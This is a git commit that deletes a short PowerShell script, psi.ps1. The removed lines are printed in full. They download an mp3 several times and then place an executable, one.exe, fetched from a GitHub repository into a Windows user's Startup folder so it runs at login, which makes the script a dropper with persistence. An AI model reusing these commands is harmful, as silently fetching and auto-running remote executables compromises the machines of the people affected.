730d804ec465be5aa909e4aa3616f4cbe53f8467
Da Femboy <77080347+TugaChan@users.noreply.github.com>
2023-02-14 11:00:22 +0000

    Delete psi.ps1

--- psi.ps1
+++
@@ -1,6 +0,0 @@
-cd "C:\ProgramData"
-Invoke-WebRequest -Uri "https://github.com/TugaChan/lolzrez/raw/main/moan.mp3" -OutFile "moan.mp3"; Invoke-WebRequest -Uri "https://github.com/TugaChan/lolzrez/raw/main/moan.mp3" -OutFile "moan.mp3"; Invoke-WebRequest -Uri "https://github.com/TugaChan/lolzrez/raw/main/moan.mp3" -OutFile "moan.mp3";Invoke-WebRequest -Uri "https://github.com/TugaChan/lolzrez/raw/main/moan.mp3" -OutFile ".mp3"
-Invoke-WebRequest -Uri "https://github.com/TugaChan/lolzrez/raw/main/one.exe" -OutFile "C:\Users\sirto\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\one.exe"
-
-
-
